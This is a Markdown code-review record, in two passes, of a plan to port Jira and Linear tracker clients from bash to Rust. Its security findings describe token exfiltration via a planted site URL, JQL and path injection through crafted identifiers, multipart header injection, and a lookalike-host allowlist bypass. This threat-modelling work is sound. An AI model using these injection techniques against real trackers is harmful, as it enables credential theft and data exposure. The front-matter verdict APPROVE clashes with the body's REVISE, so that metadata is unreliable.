---
type: "plan-review"
id: "2026-08-17-0210-provider-client-crates-over-the-tracker-port-review-1"
title: "Plan Review: Provider Client Crates over the RemoteTracker Port"
date: "2026-08-17T14:49:04+00:00"
author: "Toby Clemson"
producer: "review-plan"
status: "complete"
parent: "work-item:0210"
target: "plan:2026-08-17-0210-provider-client-crates-over-the-tracker-port"
reviewer: "Toby Clemson"
verdict: "APPROVE"
lenses: ["architecture", "correctness", "test-coverage", "security", "compatibility", "code-quality"]
review_number: 1
review_pass: 3
tags: ["rust", "jira", "linear", "integrations", "reqwest", "tracker", "adf", "graphql"]
last_updated: "2026-08-17T15:51:15+00:00"
last_updated_by: "Toby Clemson"
schema_version: 1
---

## Plan Review: Provider Client Crates over the RemoteTracker Port

**Verdict:** REVISE

This is an exceptionally well-grounded plan — the transcription-first approach, fixture-driven classification tables with row-coverage guards, tests-of-tests for the tripwire and pup probes, and the explicit protection of the frozen port are all rare discipline, and the correctness lens verified the bulk of the transcribed values (exit-code mappers, jq render rules, the 68-file breakdown, the nextest gate) as accurate against source. Four defects nonetheless block implementation: the `show` signature in Phases 5 and 6 does not match the port the plan promises not to touch; `jira.site` is an unvalidated credential destination readable from shared config; the workspace's `-no-provider` rustls feature needs a crypto-provider install that no client manifest declares and no plain-HTTP mock can catch; and the hand-transcribed oracles are validated only against themselves while the executable bash oracle is still on disk. A cluster of majors around `fetch_all` totality, the `Unconfigured` exit code, and duplicated auth/retry/identifier logic should be resolved in the same pass.

### Cross-Cutting Themes

- **The `show` signature contradicts the frozen port** (flagged by: architecture, correctness) — Phases 5 and 6 declare `Result<Option<RemoteIssue>, TrackerError>`; `cli/tracker/src/lib.rs:317` declares `Result<RemoteIssue, TrackerError>` and documents that absence is deliberately not discoverable. The plan simultaneously forbids touching the port. It cannot compile as written, and "fixing" the port would reintroduce the absent-vs-indeterminate collapse the port exists to prevent.
- **`SelectionError::Unconfigured` → exit 71 misuses a shared taxonomy** (flagged by: architecture, correctness, compatibility) — 71 is `E_DISPATCH_TERMINAL`, meaning "a remote mutation may have applied", and `skills/work/create-work-item/SKILL.md:555` emits loud non-idempotency guidance on it. A missing token provably touched nothing. Three lenses independently reached the same conclusion; correctness additionally found three unenumerated exhaustive match sites (`create.rs:337`, `update.rs:203-207`, `sync.rs:262-275`).
- **Auth, retry and identifier safety are triplicated by design** (flagged by: architecture, code-quality, test-coverage) — the plan ports `collaboration-cli`'s credential ladder twice more, duplicates the 4-attempt backoff twice, and states outright that identifier safety is "shared by copying the rule rather than the code". Test coverage adds that only the Jira copy of the identifier rule is asserted at all. The pup rule bans client-to-client imports, not a common downward dependency.
- **`fetch_all` totality is the least-specified surface in the plan** (flagged by: correctness, security, test-coverage) — empty-id short-circuit, dedup, per-chunk vs global page cap, project/team scoping, and JQL escaping of remote-supplied identifiers are all unaddressed, in the operation whose own port doc warns that getting `absent` wrong deletes live issues.
- **Untested silent-degradation paths** (flagged by: code-quality, test-coverage, security) — page-cap truncation, retry exhaustion, dropped link marks, and the Linear orphaned-asset state all resolve quietly, with no `tracing` emission specified despite `cli/kernel/src/logging.rs` existing for exactly this.

### Tradeoff Analysis

- **Transcription fidelity vs shared abstraction**: The plan deliberately copies rather than shares (identifier rule, auth ladder, retry) to keep the two client crates independent. Architecture and code-quality both argue this is the wrong reading of the pup constraint — a shared downward crate satisfies it. Recommendation: extract a `tracker-support` crate; the fidelity argument applies to the *bash oracle*, not to Rust-internal duplication.
- **Bash-faithful classification vs the "provably pre-send" rule**: The plan says "where the tables and the provably-pre-send rule disagree, the tables win" — sound, and it correctly documents Linear's unmotivated bidirectional divergence rather than unifying it. But correctness found one row where the plan diverges from bash in the *other* direction (200-body auth on update). Recommendation: keep the tables-win rule, fix that row.
- **Live contract evidence vs continuous enforcement**: Test coverage wants the contract properties run offline against `MockServer`; security wants the committed live-tenant transcript reduced or scrubbed. These agree — the live transcript is both weak enforcement and a disclosure risk. Recommendation: run `ContractSubject` conformance offline in a normal test binary, and reduce the committed evidence to counts and outcomes.
- **Feature unification vs manifest purity**: The plan prefers reusing the workspace `reqwest` entry verbatim and adding `multipart` graph-wide. Architecture wants the crate-local entry as the default; compatibility points out the stated fallback does not actually decouple the graphs (same pinned version unifies regardless). Recommendation: hand-roll the multipart body, which keeps `mime`/`mime_guess` out of the closure entirely.

### Findings

#### Critical

- 🔴 **Architecture + Correctness**: `show`'s signature contradicts the frozen port
  **Location**: Phase 5 §1 (and mirrored in Phase 6 §4)
  The plan declares `Result<Option<RemoteIssue>, TrackerError>` against a port declaring `Result<RemoteIssue, TrackerError>`, while forbidding any change to `cli/tracker`. It will not compile, and the `Option` shape reintroduces the absence-vs-unproven-miss collapse that makes a sync delete a live issue. A 404 on `show` should be `Retryable` (bash code 13), not `Ok(None)`.

- 🔴 **Security**: `jira.site` is an unvalidated credential destination read from possibly shared config
  **Location**: Phase 3 §2 / Phase 7
  Unlike `jira.token_cmd`, `jira.site` is not subject to the `Level::Team` refusal, and the resolved token is sent to whatever base URL it names. A value planted in a checked-in `.accelerator/config.md` exfiltrates the user's Jira token on the next `work sync` — and Phase 7 is exactly the phase that makes that command resolve a real client.

- 🔴 **Compatibility**: New clients omit the rustls crypto-provider install the workspace feature set requires
  **Location**: Phase 3 §1/§3, Phase 6 §1-2
  `rustls-tls-webpki-roots-no-provider` installs no provider; `cli/launcher` works only because it calls `install_default()` and declares `rustls`. Neither client manifest does. Every HTTPS request would fail at handshake, and the entire offline harness is plain HTTP over `TcpListener`, so nothing in the plan detects it until the Phase 10 live runs.

- 🔴 **Test Coverage**: Hand-transcribed oracles are validated only against themselves
  **Location**: Phase 2 §2, Phase 4 §1, Phase 3 §4 / Phase 6 §3
  Every automated check verifies Rust against a fixture a human transcribed from the same bash. A mis-transcribed cell yields a mutually-consistent fixture-plus-code pair that passes the row-coverage guard; the only defence is two manual "read it line by line" criteria. Once 0211/0212 delete the bash, the oracle is gone.

#### Major

- 🟡 **Architecture + Correctness + Compatibility**: `Unconfigured` resolving to exit 71 overloads the mutation-may-have-applied class
  **Location**: Phase 7 §1
  71 is `E_DISPATCH_TERMINAL`; a missing credential provably touched nothing, yet the skill layer emits non-idempotency warnings on 71. Correctness adds that the fourth variant breaks three exhaustive matches the plan does not enumerate.

- 🟡 **Correctness**: Linear's 200-body auth row classifies `update` Terminal where bash makes it Retryable
  **Location**: Phase 6 §3
  `_wiur_map_linear` lists code 11 in its retryable clause; the plan's own 401 and 400-auth rows (also code 11) say Retryable for update. The Phase 6 success criterion would bake the regression into the tests.

- 🟡 **Correctness**: `fetch_all` totality obligations unaddressed
  **Location**: Phase 5 §4 / Phase 6 §5
  No empty-ids short-circuit (yielding malformed `key in ()`), no dedup (bash does `| unique`), the 20-page cap is per-chunk in bash but unscoped in the plan, and `maxResults` 100 is omitted.

- 🟡 **Correctness**: `fetch_all`'s query scoping is unrecorded
  **Location**: Phase 5 §4 / Phase 6 §5
  `work-item-fetch-remote.sh:26-30` documents that the Jira read must pass `--all-projects` so no `project =` clause drops cross-project keys; Phase 5 reuses the general `jql_compose`. Linear's team-wide search has the same shape. An out-of-scope key returns unfound from a believed-complete read and is reported `absent`.

- 🟡 **Security**: JQL is string-composed from remote-supplied identifiers with no escaping requirement
  **Location**: Phase 5 §4
  An identifier containing `"`, `)` or ` OR ` breaks out of the `key in (...)` clause, widening a targeted fetch into a project dump.

- 🟡 **Security**: Interpolated path segments are never revalidated or encoded
  **Location**: Phase 8 §1-3, Phase 5 §2
  Identifier safety is scoped only to `create` responses; ids from the local corpus are not covered, and the Phase 3 path class permits `/`, `%`, `?`, `&`, `=`. A crafted `external_id` re-targets a comment-add to an arbitrary API endpoint.

- 🟡 **Security**: Upload-URL allowlist under-specified
  **Location**: Phase 9 §2
  The bash anchors the host match at a label boundary (rejecting `uploads.linear.app.evil.com`), validates `assetUrl` too, and redacts the query string from diagnostics. None of the three appear in the plan.

- 🟡 **Security**: The loopback bypass must not be an environment variable in the shipped binary
  **Location**: Phase 9 §2
  Bash implements the "test flag" as `ACCELERATOR_TEST_MODE=1`; carried into a compiled binary, any process that can set an env var disables the SSRF allowlist.

- 🟡 **Security**: No requirement that tokens and `token_cmd` output stay out of diagnostics
  **Location**: Phase 7 §1, Phase 3 §2
  `Unconfigured` carries `detail: error.to_string()` to CLI output; nothing forbids folding `token_cmd` stdout into it.

- 🟡 **Security**: Committed live-tenant contract evidence is an information-disclosure risk
  **Location**: Phase 10 §2
  Verbatim transcripts of live `show`/`fetch_all` runs carry issue bodies, account ids, emails and site hostnames into the repo permanently.

- 🟡 **Security**: API transports leave the default redirect policy and have no response-size bound
  **Location**: Phase 3 §3, Phase 6 §2
  Redirect refusal is specified only for the upload transport; following a redirect defeats the Phase 3 path validator, which inspects only the initial path.

- 🟡 **Architecture**: No shared client kernel
  **Location**: Phases 3, 5, 6
  Credential precedence, retry/backoff/timeout, and identifier safety each get two independent copies with no cross-check.

- 🟡 **Architecture**: The non-port provider surface has no abstraction
  **Location**: Phases 8, 9
  `comment`, `transition`, `attach` and `init` are concrete per-crate modules, so 0211's composition root must name both concrete client types — and the tripwire won't catch it.

- 🟡 **Architecture**: No aggregate call budget
  **Location**: Phase 5 §4/§7, Phase 6 §5, Performance Considerations
  20 pages (Jira additionally chunked) × 30s + backoffs has no operation-level deadline; the stated "roughly 30s plus three backoffs" understates the worst case by orders of magnitude.

- 🟡 **Architecture**: "Nothing changes for a user" is untrue for the `accelerator work` binary
  **Location**: Overview, Phase 7
  Phase 7 gives a user-invocable path live network behaviour and changes an observable exit code, while the framing invites reviewers to treat the merge as inert.

- 🟡 **Correctness**: `RemoteIssue.body`'s trailing newline contradicts itself
  **Location**: Phase 2 §1, Phase 5 §3/§6
  The port doc requires a trailing newline; `project` emits none; Phases 5 and 6 assert goldens that have one.

- 🟡 **Compatibility**: The `multipart` feature-union fallback does not avoid the union
  **Location**: Phase 8 §3
  A crate-local `reqwest` entry at the same pinned version unifies identically, so the stated escape hatch leaves Phase 8 with no path if the guard goes red.

- 🟡 **Compatibility**: Proposed package names contradict the workspace convention and break the `-p` commands
  **Location**: Phase 1 §1-2, Phase 2 §1, Phase 3 §1, success criteria throughout
  The `accelerator-` prefix is reserved for dispatched binaries. `tasks/public_api.py` requires directory name == package name, so `remote-projection` cannot be pinned as specified, and ~a dozen `-p accelerator-*` commands name no real package.

- 🟡 **Compatibility**: Adding `linear.team_id` misses the committed dump golden and the documented key set
  **Location**: Phase 2 §4
  `cli/launcher/tests/fixtures/dump/dump.golden` will fail on the first `mise run` with no regeneration instruction; `skills/config/configure/SKILL.md`'s key list diverges.

- 🟡 **Compatibility**: The sibling-ordering obligation leaves the Linear and provider-surface oracles unguarded
  **Location**: Implementation Approach, Migration Notes
  Gating only on Phases 1, 2, 4 and 5 lets 0211 delete `linear-graphql.sh`, the comment/attach/init flows and `linear-attach-flow.sh` before Phases 6, 8 and 9 land.

- 🟡 **Compatibility**: The `serde_json`/`jq` divergence is asserted but no policy is chosen
  **Location**: Phase 5 §6
  Large integers and whole-valued floats format differently; the offline fixtures may contain no numbers, so the assertion could pass vacuously while a live payload mass-reclassifies the corpus.

- 🟡 **Test Coverage**: Contract conformance is never checked in CI
  **Location**: Phase 5 §5, Phase 6 §6, Phase 10 §2
  A dated transcript cannot fail; a refactor breaking partition totality ships green.

- 🟡 **Test Coverage**: Retry-loop tests will really sleep, and jitter is never asserted
  **Location**: Phase 3 §3
  No injected clock or seeded jitter; a `Retry-After` test that counts hits cannot distinguish obeyed from ignored.

- 🟡 **Test Coverage**: Wall-clock windows at 1.35×T are flake-prone
  **Location**: Phase 5 §7, Phase 6 §6
  140ms of slack at T = 400ms, eight such assertions, on a runner with a documented flake history.

- 🟡 **Test Coverage**: Linear's identifier-safety copy has no assertions
  **Location**: Phase 6 §4
  Two independent copies of a security-relevant rule, tests on one.

- 🟡 **Test Coverage**: "Asserts the engine reaches the provider" is too weak for the integration seam
  **Location**: Phase 7 §4
  A hit count catches none of the classification, hash and exit-code bugs that surface to users here.

- 🟡 **Test Coverage**: JQL and `IssueFilter` composition get no row-coverage guard
  **Location**: Phase 5 §4, Phase 6 §5
  Ten flag families with negation is exactly the table shape the plan guards rigorously elsewhere.

- 🟡 **Test Coverage**: Cache-writing error paths and lock contention are unspecified
  **Location**: Phase 8 §4, Phase 9 §3
  The injected filesystem port exists to make these testable; only the pure-value half is tested.

- 🟡 **Code Quality**: No logging or tracing specified for any silent-degradation path
  **Location**: Phases 3, 5, 6, 8, 9
  Nothing distinguishes cap-hit, retry exhaustion, rate limit and dropped connection in a 3am `indeterminate` batch.

- 🟡 **Code Quality**: The error taxonomy across four error types is unspecified and loses context
  **Location**: Phase 3 §2, Phase 6 §1, Phase 7 §1
  Every client failure category arrives at the CLI as one opaque `Unconfigured` string with no `source()` chain.

- 🟡 **Code Quality**: Phase 6 bundles what Jira spreads across three phases
  **Location**: Phase 6
  The subtlest classification logic in the plan arrives as the largest single reviewable unit.

#### Minor

- 🔵 **Correctness**: `Transport::with_timeout` cannot work as sketched — a `reqwest` client's timeout is fixed at build time, so the setter is a no-op unless it rebuilds (**Location**: Phase 3 §3)
- 🔵 **Correctness**: Three whole-document render abort conditions unrecorded — absent `.attrs.level`, non-`doc` root (`E_BAD_JSON`), `text` node with no `text` key (**Location**: Phase 4 §2)
- 🔵 **Correctness**: The timeout window is only valid if transport failures are not retried; the plan states the retry policy and the window in unconnected sections (**Location**: Phase 5 §7)
- 🔵 **Correctness**: `Box<dyn RemoteTracker>` is implicitly `'static`, so `from_config` must resolve every value eagerly (**Location**: Phase 7 §1)
- 🔵 **Correctness**: `MockServer` recording order and synchronisation unspecified — the retry-count assertions are the shape that races (**Location**: Phase 1 §1)
- 🔵 **Security**: `token_cmd` shell-out has no timeout, output bound, or CR/LF validation on the Jira side (**Location**: Phase 3 §2, Phase 6 §1)
- 🔵 **Security**: TLS posture inherited implicitly — no stated verification invariant, and the tripwire doesn't guard `danger_accept_invalid_certs` (**Location**: Phase 3 §1)
- 🔵 **Security**: Attachment pre-checks are TOCTOU-shaped (stat-then-open) and path-unconfined (**Location**: Phase 8 §3, Phase 9 §2)
- 🔵 **Architecture**: The injected filesystem port for caches is unnamed, risking a second implementation of the `owner.<nonce>` lock contract (**Location**: Phase 8 §4, Phase 9 §3)
- 🔵 **Architecture**: ADF conversion is a pure core buried inside an HTTP adapter crate — the same argument that justified extracting `remote-projection` (**Location**: Phase 4)
- 🔵 **Architecture**: Feature unification lets an adapter's need mutate the launcher's graph; invert the default (**Location**: Phase 8 §3)
- 🔵 **Architecture + Code Quality**: Cache-derived resolutions are "constructor inputs until Phase 8/9" with no end state chosen (**Location**: Phase 5 §4, Phase 6 §5)
- 🔵 **Compatibility**: webpki-roots replaces curl's system trust store — a regression for corporate-proxy and private-CA users, unrecorded (**Location**: Phase 3 §3)
- 🔵 **Compatibility**: A byte-exact committed `cargo deny list` diff is brittle against lockfile and tool-version drift (**Location**: Phase 10 §1)
- 🔵 **Code Quality**: The tripwire's string-literal heuristics will misfire on doc strings and error messages (**Location**: Phase 7 §3)
- 🔵 **Code Quality**: "Re-export or repoint callers — either is acceptable" leaves two live public paths (**Location**: Phase 2 §1)
- 🔵 **Code Quality**: `MockServer` has a `(method, path)` data clump and a server-global `last_header` that Phase 9's three-step upload assertions need per-route (**Location**: Phase 1 §1)
- 🔵 **Test Coverage**: The fixture-count guard asserts a bare 68 — too strict for unrelated additions, too loose for a delete-plus-add (**Location**: Phase 2 §3)
- 🔵 **Test Coverage**: The `serde_json`/`jq` divergence gets one unspecified assertion for a whole defect class (**Location**: Phase 5 §6)
- 🔵 **Test Coverage**: The upload trust boundary is tested only against self-shaped mocks; the hand-rolled MIME sniffer has no assertions at all (**Location**: Phase 9 §2)

#### Suggestions

- 🔵 **Test Coverage**: The mock-server union changes two working suites with no characterisation net beyond "passes unchanged" (**Location**: Phase 1 §3)
- 🔵 **Code Quality**: Deliberately reproduced bash bugs need one named home, not a scattering of tests (**Location**: Phase 4 §2-3)
- 🔵 **Code Quality**: Two phases of public API with no caller until 0211 lands (**Location**: Phases 8, 9)
- 🔵 **Compatibility**: New crate manifests omit `[lints] workspace = true` and mix path with workspace dependency styles (**Location**: Phase 1 §1, Phase 3 §1)

### Strengths

- ✅ The frozen port is protected mechanically, not by convention: unchanged public-API snapshot, dependency-free manifest, and `structure.rs` passing untouched are all named criteria.
- ✅ The transcriptions are accurate where checked — the exit-code mappers, the byte-identical Jira create/update clause, the jq render rules, the 68-file breakdown and the nextest binary-name gate all verify against source.
- ✅ Row-coverage guards that fail the build on an unconsumed fixture row kill the "table grew, tests didn't" failure mode.
- ✅ Three tests are themselves tested by planting deliberate violations — rare and genuinely valuable discipline.
- ✅ Serialisation stability is treated as the first-class risk it is: untyped `Value` end to end, key-order invariance asserted by comparing two records to each other, and the absent-vs-null-vs-empty divergence called out per provider.
- ✅ Dependency injection is designed in rather than retrofitted — timeout, base URL, ADF seed and cache resolutions are constructor parameters, explicitly not environment reads.
- ✅ The Linear upload is modelled as a genuinely separate transport with an explicit policy table, and each control has its own criterion.
- ✅ Interactive surfaces are kept out of the client crates per ADR-0045, and the `reqwest` tripwire is correctly an allowlist rather than a bare grep.
- ✅ Provider concretions are fenced at three levels — pup rules, the import tripwire, and probe pairs that test the enforcement itself.
- ✅ Phase ordering front-loads the oracle transcriptions so the siblings unblock early, and the cross-plan obligation is stated explicitly.

### Recommended Changes

1. **Correct the `show` signature in Phases 5 and 6** (addresses: the critical port contradiction)
   Change to `Result<RemoteIssue, TrackerError>` and state that a 404 is `Retryable` (bash 13), not `Ok(None)`.

2. **Validate `jira.site` as a credential destination** (addresses: the `jira.site` critical)
   Require absolute `https://`, no userinfo, no query/fragment, host matching an allow shape; refuse a `Level::Team` value that doesn't pass. Add criteria for `http://`, userinfo-bearing and non-allow-listed hosts.

3. **Declare `rustls` and install the crypto provider in both clients** (addresses: the rustls critical)
   Mirror `cli/launcher`'s `install_default()` shape, and add a criterion asserting a real TLS handshake rather than relying on the plain-HTTP mock.

4. **Add an automated differential test against the live bash oracle** (addresses: the transcription critical)
   While the bash exists: drive the five mappers over codes 0-130 and compare exit status to the Rust classifier; drive `jira-adf-to-md.sh` and the tokenise/assemble pipeline over the ADF fixture corpus and assert byte-identity. Gate on bash availability, not credentials, and delete it in 0212.

5. **Give `Unconfigured` its own exit code** (addresses: three lenses' exit-71 finding)
   A new value alongside 72/73, added to `work-item-bridge-codes.sh` and the SKILL.md dispatch tables. Enumerate the three exhaustive match sites in Changes Required.

6. **Fix the Linear 200-body auth update row** (addresses: the classification divergence)
   Change to Retryable to match `_wiur_map_linear`, or record the deliberate divergence in `## Decisions` and the fixture header.

7. **Specify `fetch_all` totality and JQL safety** (addresses: the totality, scoping and injection findings)
   Empty-set short-circuit, id dedup, per-chunk page cap with `maxResults` 100, no injected `project =` clause, quoted-and-escaped JQL literals with a hostile-identifier test, and an explicit decision on out-of-team Linear ids.

8. **Extract a shared `tracker-support` crate** (addresses: the triplication findings)
   Credential ladder parameterised by key names, the retry/backoff policy as an injectable value, and the identifier-safety predicate — keeping the client-to-client pup ban intact.

9. **Correct the package names and `-p` commands** (addresses: the naming finding)
   Name the libraries `http-test-support` and `remote-projection` to match their directories, and fix every `-p accelerator-*` in the success criteria.

10. **Tighten the transport's security posture** (addresses: redirects, size bounds, path interpolation, secrets in diagnostics)
    `redirect::Policy::none()` on both API transports, an explicit response-size cap, percent-encoded path segments with identifier safety applied to every id, and a redacting `Debug` on credentials with a sentinel-secret test.

11. **Make the contract properties enforce offline** (addresses: the contract-evidence and disclosure findings)
    Run `ContractSubject` conformance against `MockServer` in a normal test binary; reduce the committed evidence to names, outcomes and counts, with a secret-shaped-pattern guard.

12. **Inject a clock and seeded jitter; loosen the timing windows** (addresses: the retry and flake findings)
    Assert the computed delay sequence as data; keep the lower bound tight and the upper bound generous, or assert the error variant instead.

13. **Restate the sibling-ordering obligation per bash asset** (addresses: the unguarded-oracle finding)
    A deletion-gate table naming each script and the phase that must land first, recorded where 0211 can check it off.

14. **Add `tracing` to the degradation paths and define the error taxonomy** (addresses: the observability and error-modelling findings)
    `debug` per attempt, `warn` on cap truncation, retry exhaustion and orphaned assets; one error enum per client with `source()` chaining into a boxed `Unconfigured` source.

15. **Regenerate `dump.golden` and update the documented key list in Phase 2** (addresses: the config-key finding)

16. **Split Phase 6 into foundation and port phases** (addresses: the phase-sizing finding)
    Mirroring the Jira shape so review effort tracks risk.

17. **Replace the `multipart` fallback with one that decouples** (addresses: the feature-union finding)
    Hand-roll the multipart body over the existing byte-body path, keeping `mime`/`mime_guess` out of the closure.

---
*Review generated by /accelerator:review-plan*

## Re-Review (Pass 2) — 2026-08-17

**Verdict:** REVISE

All six lenses re-ran against the revised plan. Every pass-1 finding is resolved or partially resolved — the four criticals are closed and verified against source, and several lenses independently confirmed the corrections (exit 74 is genuinely free; code 11 really is in `_wiur_map_linear`'s retryable clause; the three match sites resolve to real lines). The verdict stays REVISE because the edits introduced **two new criticals and fourteen new majors**, most of them second-order consequences of the fixes themselves: the pass-1 changes were locally right but their ripples were not traced far enough into the shared taxonomy, the test seams, and the Cargo feature graph.

### Previously Identified Issues

**Criticals — all four closed:**

- ✅ **Architecture + Correctness**: `show` returns `Option` — **Resolved**. Now `Result<RemoteIssue, TrackerError>` in Phases 5 and 6b, matching `cli/tracker/src/lib.rs:317`, with the 404-is-Retryable consequence stated.
- ✅ **Security**: `jira.site` unvalidated — **Resolved** as the primary hole, but see the new finding on the self-hosted allowlist's storage level, which can reopen it.
- ✅ **Compatibility**: missing rustls crypto provider — **Resolved**. Both manifests declare `rustls` and install the ring provider; verified against `cli/launcher/src/launch/outbound/tls.rs:9-12`.
- ✅ **Test Coverage**: self-validating oracles — **Resolved** in principle by the two differential suites, though the silent-skip gate and the manual mutation checks weaken them (new minors).

**Majors — resolved:** the Linear 200-body auth row (verified correct against `work-item-update-remote.sh:66-72`), `fetch_all` totality and scoping, `Unconfigured` off the 70/71 band, the shared `tracker-support` extraction, tracing on degradation paths, the retry/jitter seam design, the timing-window asymmetry, JQL escaping and path re-validation, the upload allowlist trio, the constructor-parameter loopback, reduced contract evidence, redirect and size bounds, package names, `dump.golden`, the per-asset ordering table, Phase 6's split, and the strengthened sync-engine assertions.

**Partially resolved:** the non-port provider surface still has no abstraction (now an explicitly reasoned deferral rather than an oversight — accepted); the `serde_json`/`jq` policy is now chosen but the chosen policy is wrong on its own premises (below); the exit-74 edit set is incomplete (below).

**Still present:** the ADF pure core remains inside the HTTP adapter crate with no pup rule scoping its purity — a minor carried forward deliberately, since a `cli/jira-adf` split was outside the seventeen applied changes.

### New Issues Introduced

#### Critical

- 🔴 **Compatibility**: **Exit 74 lands in `push_decide`'s unknown-code default — the exact branch it was created to avoid.** `cli/work/src/sync/push_decide.rs:51-63` routes 0, 70, 72 and 73 explicitly and sends everything else to `PushOutcome::LoudTerminal`. So a credential-less `create --push` now produces the "a remote issue may already exist" guidance that moving off 71 was meant to prevent. `push_decide.rs`, its bash twin, and the golden are all unlisted in Phase 7.
- 🔴 **Test Coverage**: **The offline contract harness cannot call the conformance functions.** Every property in `cli/tracker-test-support/src/contract.rs` starts with `ensure_opted_in()?` and returns `NotOptedIn` unless `ACCELERATOR_TRACKER_CONTRACT=1` — a behaviour that crate's own test pins deliberately. The new `contract_offline.rs` therefore either fails to compile, asserts nothing while passing, or sets the env var and reopens the live-provider hole. No phase proposes splitting the properties from their gated wrappers.

#### Major

- 🟡 **Architecture + Code Quality + Correctness** (three lenses, independently): **The Phase 7 registry code block still flattens the error to `detail: error.to_string()`** while the prose beneath it and Phase 3 §4 both demand a boxed `source()`. The prose was updated in the revision; the snippet was not — and the snippet is what gets copied.
- 🟡 **Architecture + Code Quality**: **Two parallel error taxonomies for the same five credential conditions.** Phase 3 §2 returns `kernel::Error::Refusal` (a flat `String`, no `source()`); Phase 3 §4 requires structured `ClientError` variants. The `CredentialError` that `tracker-support` exists to provide is destroyed at the `auth.rs` boundary, making the `source()` criteria unsatisfiable.
- 🟡 **Security + Correctness + Compatibility** (three lenses): **`serde_json/arbitrary_precision` unifies workspace-wide** — onto `launcher`, `visualiser/server`, `corpus-adapters` and four more — by exactly the Cargo argument the plan uses two phases later to forbid `multipart`. It changes `Value::Number`'s representation and `untagged`/`flatten` behaviour in a binary that verifies signed artefacts.
- 🟡 **Correctness + Compatibility**: **The `arbitrary_precision` rationale is self-contradictory and its jq example is stale.** The plan says `jq -cS` prints `1` for `1.0` and then that preserving literals matches jq — those cannot both hold. `mise.toml:16` pins jq 1.7.1, which preserves literals; the `1.0` → `1` claim is 1.6 behaviour. The adversarial table would be authored against the wrong oracle.
- 🟡 **Security**: **The hand-rolled multipart body has no filename-escaping or boundary-collision rule.** A filename bearing `"` or CRLF injects part headers into an authenticated upload; a file containing the boundary truncates it. This is the class the vetted `multipart` implementation exists to prevent — traded away on a dependency-graph argument without replacing the safety contract.
- 🟡 **Security**: **The self-hosted `jira.site` allowlist has no specified storage level.** If read like any other config value, a hostile repo supplies both the site and the allowlist entry blessing it — restoring the pass-1 critical with the shape check now passing.
- 🟡 **Security**: **`token_cmd` is repository-relative RCE and Phase 7 arms it.** `Level::Personal` resolves from `.accelerator/config.local.md`, which a hostile repo can simply track; the `.gitignore` rule does not apply to an already-tracked file.
- 🟡 **Test Coverage**: **The `jira.site` validator rejects the loopback mock URLs the offline tests depend on.** `contract_offline.rs`, the timeout/pagination/JQL/corpus suites and Phase 7's `sync_run_real_client` all point production-path clients at cleartext `127.0.0.1`. No test seam is declared, so the likely fix under pressure is an env escape hatch — the pattern Phase 9 explicitly rejects.
- 🟡 **Test Coverage + Correctness**: **The `rg -c "contract"` criterion is now unsatisfiable**, because the same phase adds a `contract_offline` binary the default profile deliberately selects. The cheapest fix is deleting the offline run — the plan's only continuous enforcement.
- 🟡 **Test Coverage**: **The sleep/clock seam promised in Phase 2 never reaches Phase 3's `TransportConfig`**, so the mock-backed retry tests still execute real backoff — roughly 7s per case, doubled across both providers.
- 🟡 **Test Coverage**: **`sync_run_real_client.rs` is placed in `work-adapters`, which cannot see `ConfiguredTrackers` or the exit codes it asserts.** Both live in `work-cli`, above it.
- 🟡 **Correctness**: **The trailing-newline fix misdescribes `expected.txt`.** That file is keyed metadata, and `project_remote_parity.rs:47-55` reconstructs the body line-wise with no trailing newline. Comparing `project(...) + "\n"` against it fails.
- 🟡 **Correctness**: **Exit 74 breaks `sync_help_names_every_exit_code`** (`cli_sync.rs:137-147`) and the hand-maintained help taxonomy at `cli.rs:78-87`; `cli_surface.golden` therefore does move.
- 🟡 **Correctness**: **"No credentials configured, which is the state a test process is in" is not guaranteed.** The ladder puts environment first and the tests inherit it, so a credentialed machine resolves a real client and the default suite makes live calls.
- 🟡 **Compatibility**: **Adding 74 breaks `exit_codes_parity.rs:58-63`**, which hard-asserts exactly four `E_DISPATCH_*` constants, and misses `EXIT_CODES.md`, four script headers, `sync-work-items/SKILL.md` and `dispatch-codes.txt`.
- 🟡 **Compatibility**: **`linear.team_id` duplicates a value bash reads from `catalogue.json`.** Every already-onboarded user hits exit 74 on the Rust path while bash keeps working.
- 🟡 **Architecture + Compatibility**: **The shared fixture is homed in `cli/tracker/`**, which Phase 5 requires to show no diff and the plan promises not to touch. It belongs in `tracker-support`.
- 🟡 **Architecture + Test Coverage**: **The TLS-handshake assertion names no mechanism**, and every stated constraint (std-only mock, no new dev-dependency) blocks the obvious ones.
- 🟡 **Compatibility**: **New manifests use `{ workspace = true }` for intra-workspace deps that have no `[workspace.dependencies]` entries** — `cli/Cargo.toml` carries no local-crate entries at all; every existing member uses path deps.

#### Minor

- 🔵 **Correctness**: The third render-abort condition is wrong — a text node with no `.text` and no marks renders empty rather than raising; only the marked variant aborts.
- 🔵 **Correctness**: The per-asset ordering table under-constrains `jira-request.sh` (needed by Phase 8) and the mappers (needed by Phases 3/6a and executed by the differential test), and omits `linear-create-flow.sh` and five other transcription sources.
- 🔵 **Correctness**: Phase 6b says the newline is appended "as Phase 5 does", but Phase 5 §3 never states it.
- 🔵 **Security**: Percent-encoding and the decode-then-recheck validator conflict for ids legitimately containing `/`.
- 🔵 **Security**: The tripwire guards only the `danger_accept_*` symbols, not the redirect policy, the loopback constructor or the size bound.
- 🔵 **Security**: `max_response_bytes` has no pinned default; the upload transport — the least-trusted one — has no stated bound at all; the evidence guard is a denylist.
- 🔵 **Code Quality**: `RetryPolicy::delays` takes one `Retry-After` and returns the whole sequence, but the header arrives per response; the shape does not compose with its only caller.
- 🔵 **Code Quality**: `tracker-support` is one character from `tracker-test-support` and names a bucket rather than a domain concept.
- 🔵 **Code Quality**: The cache write path is new production surface with no caller — the same YAGNI argument the plan applies to `comment`/`transition`, inconsistently.
- 🔵 **Test Coverage**: The two mutation checks ("verified by planting a deliberate error") are listed as automated but describe one-off manual experiments.
- 🔵 **Test Coverage**: The bash/jq availability gate skips silently — the anti-self-validation mechanism can lapse unnoticed.
- 🔵 **Test Coverage**: The scalar 68 and per-directory counts survive beside the set-based guard, asserted by nothing.
- 🔵 **Compatibility**: The `*.atlassian.net` narrowing breaks working self-hosted configurations, and its escape-hatch key is registered nowhere.
- 🔵 **Architecture**: Transport bounds (deadline, page cap, response cap, sleep port) and the newline adapter are per-client despite the shared-policy principle.
- 🔵 **Architecture**: The tripwire allowlist mixes package names with paths, and `cli/*/src/**/*.rs` cannot reach `visualiser/server`.
- 🔵 **Code Quality**: At 2,730 lines several rationales are restated three to five times, and duplicated prose is precisely where the Phase 7 contradiction came from.

### Assessment

The plan is substantially stronger than it was, and none of the pass-1 defects survive. The new findings are of a different character: they are almost entirely **integration debt from the fixes**, and they cluster into four groups that can be closed together.

